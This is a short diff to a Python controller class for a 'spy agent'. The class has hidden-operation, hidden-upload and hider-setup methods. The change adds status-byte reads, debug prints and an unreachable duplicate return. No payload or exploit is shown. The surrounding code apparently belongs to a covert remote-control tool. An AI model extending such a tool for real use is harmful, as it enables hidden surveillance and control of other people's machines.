@@ -2,6 +2,7 @@ from connection import Connection
 from command import Command
 from responce import Responce
 from funCode import FunCode
+from status import Status
 
 """this class is for controling 1 spy agent"""
 
@@ -40,6 +41,11 @@ class Agent:
 
         with self.connect() as conn:
             conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, ""))
+            results = list()
+            results.append(conn.recv_bytes(Status.sizeof))
+            results.append(conn.recv_bytes(Status.sizeof))
+            results.append(conn.recv_bytes(Status.sizeof))
+            return conn.recv_full_responce(), results
             return conn.recv_full_responce()
 
     def hidden_action_with_upload(
@@ -57,7 +63,16 @@ class Agent:
                 )
             )
             conn.send_data(fileContent)
-            return conn.recv_full_responce()
+            results = list()
+            print("a")
+            results.append(conn.recv_bytes(4))
+            print("b")
+            results.append(conn.recv_bytes(4))
+            print("c")
+            results.append(conn.recv_bytes(4))
+            print("d")
+            print(f"results = {results}")
+            return conn.recv_full_responce(), results
 
     # prob redundant in future
     def hider_setup(self, hiderPath: str) -> Responce:
